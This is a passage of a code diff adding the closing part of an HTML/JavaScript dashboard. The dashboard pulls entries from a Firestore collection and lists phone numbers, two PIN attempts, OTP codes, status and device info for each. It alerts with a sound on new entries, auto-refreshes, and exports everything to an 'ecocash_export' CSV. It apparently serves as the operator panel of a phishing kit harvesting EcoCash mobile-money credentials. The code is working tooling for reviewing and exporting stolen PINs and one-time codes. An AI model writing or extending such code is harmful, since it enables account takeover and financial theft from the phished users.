+              <td><span class="badge badge-info">${deviceIcon} ${entry.userAgent ? 'Device' : 'Unknown'}</span></td>
+            `;
+            
+            tableBody.appendChild(row);
+          });
+        }
+        
+        updateTimeSpan.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
+      }
+
+      function displayUnseenEntries() {
+        const unseenEntries = getUnseenEntries();
+        
+        if (unseenEntries.length === 0) {
+          newDataSection.style.display = 'none';
+          newDataBanner.style.display = 'none';
+          return;
+        }
+        
+        newDataCount.textContent = unseenEntries.length;
+        newDataBanner.style.display = 'flex';
+        
+        newDataSection.style.display = 'block';
+        newSectionCount.textContent = unseenEntries.length;
+        
+        newTableBody.innerHTML = '';
+        unseenEntries.forEach((entry, index) => {
+          const row = document.createElement('tr');
+          const timestamp = entry.timestamp ? formatTimestamp(entry.timestamp) : 'N/A';
+          const formattedPhone = formatPhoneNumber(entry.phoneNumber);
+          const deviceIcon = getDeviceIcon(entry.userAgent);
+          
+          let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '—');
+          let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '—');
+          let otp = entry.otp || '—';
+          
+          if (entry.pin && !entry.pin1 && !entry.pin2) {
+            if (entry.attempt === 1) pin1 = entry.pin;
+            else if (entry.attempt === 2) pin2 = entry.pin;
+          }
+          
+          row.innerHTML = `
+            <td>${index + 1}</td>
+            <td class="phone-number">${formattedPhone}</td>
+            <td class="pin-display">${pin1}</td>
+            <td class="pin-display">${pin2}</td>
+            <td class="otp-display">${otp}</td>
+            <td>${getAttemptBadge(entry.attempt)}</td>
+            <td>${getStatusBadge(entry.status)}</td>
+            <td class="timestamp">${timestamp}</td>
+            <td><span class="badge badge-info">${deviceIcon} ${entry.userAgent ? 'Device' : 'Unknown'}</span></td>
+          `;
+          
+          newTableBody.appendChild(row);
+        });
+        
+        if (unseenEntries.length > 0 && soundEnabled) {
+          playNotificationSound();
+        }
+      }
+
+      function markAllAsSeen() {
+        allEntries.forEach(entry => {
+          seenEntryIds.add(entry.id);
+        });
+        
+        saveSeenEntries();
+        
+        displayUnseenEntries();
+        displayAllEntries();
+      }
+
+      function fetchEntries() {
+        loadingIndicator.style.display = 'block';
+        dataTable.style.display = 'none';
+        noDataMessage.style.display = 'none';
+        
+        db.collection(COLLECTION_NAME)
+          .orderBy('timestamp', 'desc')
+          .get()
+          .then((querySnapshot) => {
+            allEntries = [];
+            querySnapshot.forEach((doc) => {
+              allEntries.push({
+                id: doc.id,
+                ...doc.data()
+              });
+            });
+            
+            displayUnseenEntries();
+            displayAllEntries();
+            
+            if (autoRefreshEnabled) {
+              timeLeft = refreshInterval;
+              updateTimerDisplay();
+            }
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+            loadingIndicator.style.display = 'none';
+            noDataMessage.style.display = 'block';
+            noDataMessage.innerHTML = `
+              <i>❌</i>
+              <p>Error loading data</p>
+              <p style="font-size: 12px;">${error.message}</p>
+            `;
+          });
+      }
+
+      function exportToCSV() {
+        if (filteredEntries.length === 0) {
+          alert('No data to export');
+          return;
+        }
+        
+        const headers = ['Phone Number', 'PIN 1', 'PIN 2', 'OTP', 'Attempt', 'Status', 'Timestamp', 'User Agent', 'Page URL'];
+        const csvRows = [headers.join(',')];
+        
+        filteredEntries.forEach(entry => {
+          let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '');
+          let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '');
+          let otp = entry.otp || '';
+          
+          if (entry.pin && !entry.pin1 && !entry.pin2) {
+            if (entry.attempt === 1) pin1 = entry.pin;
+            else if (entry.attempt === 2) pin2 = entry.pin;
+          }
+          
+          const row = [
+            `"${entry.phoneNumber || ''}"`,
+            `"${pin1}"`,
+            `"${pin2}"`,
+            `"${otp}"`,
+            `"${entry.attempt || ''}"`,
+            `"${entry.status || ''}"`,
+            `"${entry.timestamp ? entry.timestamp.toDate().toLocaleString() : ''}"`,
+            `"${entry.userAgent || ''}"`,
+            `"${entry.pageUrl || ''}"`
+          ];
+          csvRows.push(row.join(','));
+        });
+        
+        const csvString = csvRows.join('\n');
+        const blob = new Blob([csvString], { type: 'text/csv' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `ecocash_export_${new Date().toISOString().slice(0,10)}.csv`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(url);
+      }
+
+      // ==================== EVENT LISTENERS ====================
+      searchInput.addEventListener('input', (e) => {
+        searchTerm = e.target.value;
+        displayAllEntries();
+      });
+
+      filterBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+          filterBtns.forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          currentFilter = btn.dataset.filter;
+          displayAllEntries();
+        });
+      });
+
+      refreshBtn.addEventListener('click', fetchEntries);
+      exportBtn.addEventListener('click', exportToCSV);
+      autoRefreshBtn.addEventListener('click', toggleAutoRefresh);
+      soundToggle.addEventListener('click', toggleSound);
+      markSeenBtn.addEventListener('click', markAllAsSeen);
+
+      // ==================== INITIAL LOAD ====================
+      loadSeenEntries();
+      loadSettings();
+      
+      if (soundEnabled) {
+        soundToggle.classList.add('active');
+        soundIcon.textContent = '🔊';
+        soundText.textContent = 'Sound On';
+      } else {
+        soundToggle.classList.remove('active');
+        soundIcon.textContent = '🔇';
+        soundText.textContent = 'Sound Off';
+      }
+      
+      if (autoRefreshEnabled) {
+        autoRefreshBtn.classList.add('active');
+        autoRefreshBtn.innerHTML = '<span>⏹️</span> <span>Auto</span>';
+        startTimer();
+      } else {
+        autoRefreshBtn.classList.remove('active');
+        autoRefreshBtn.innerHTML = '<span>⏺</span> <span>Auto</span>';
+      }
+      
+      fetchEntries();
+
+      // Pull-to-refresh
+      let touchStartY = 0;
+      document.addEventListener('touchstart', (e) => {
+        touchStartY = e.touches[0].screenY;
+      }, { passive: true });
+      
+      document.addEventListener('touchmove', (e) => {
+        const touchY = e.touches[0].screenY;
+        const scrollTop = document.documentElement.scrollTop;
+        
+        if (scrollTop === 0 && touchY > touchStartY + 100) {
+          fetchEntries();
+          touchStartY = touchY;
+        }
+      }, { passive: true });
+
+    })();
+  </script>
+</body>
+</html>
